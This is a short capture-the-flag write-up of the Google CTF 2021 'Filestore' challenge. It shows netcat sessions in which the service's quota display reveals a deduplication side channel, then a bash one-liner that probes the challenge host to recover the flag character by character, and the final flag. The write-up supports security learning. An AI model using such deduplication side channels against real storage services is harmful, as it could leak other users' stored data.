+++
title = "Filestore Writeup (Google CTF 2021)"
date = "2021-07-19"
updated = "2024-07-12"
+++

## Description

We stored our flag on this platform, but forgot to save the id. Can you help us restore it?

`filestore.2021.ctfcompetition.com 1337`

## Solution

Let's analyze the challenge

```
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
```

So we can 
- `load` -> retrieve the stored text using the id
```
Send me the file id...
QpNmkzQzzHy4SV8i
123
```
- `store` -> store some text
```
Send me a line of data...
123
Stored! Here's your file id:
QpNmkzQzzHy4SV8i
```
- `status` -> view the memory status
```
User: ctfplayer
Time: Sun Jul 18 20:11:24 2021
Quota: 0.026kB/64.000kB
Files: 1
```
- `exit` -> close the connection

Before analyzing the given file we started to make some test and found that if we enter `CTF{` the `Quota` value didn't change

```
$ nc filestore.2021.ctfcompetition.com 1337
== proof-of-work: disabled ==
Welcome to our file storage solution.

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sun Jul 18 20:16:51 2021
Quota: 0.026kB/64.000kB
Files: 1

Menu:
- load
- store
- status
- exit
store
Send me a line of data...
CTF{
Stored! Here's your file id:
kVLwEEpyVwpqwoI4

Menu:
- load
- store
- status
- exit
status
User: ctfplayer
Time: Sun Jul 18 20:16:59 2021
Quota: 0.026kB/64.000kB
Files: 2
```

So maybe we can bruteforce one character of the flag per time
I use this bash command and find each character in the flag. x_x

```
$ echo "store\nCTF{\nstatus\nexit" | nc filestore.2021.ctfcompetition.com 1337 | grep Quota
```

#### **FLAG >>** `CTF{CR1M3_0f_d3dup1ic4ti0n}`
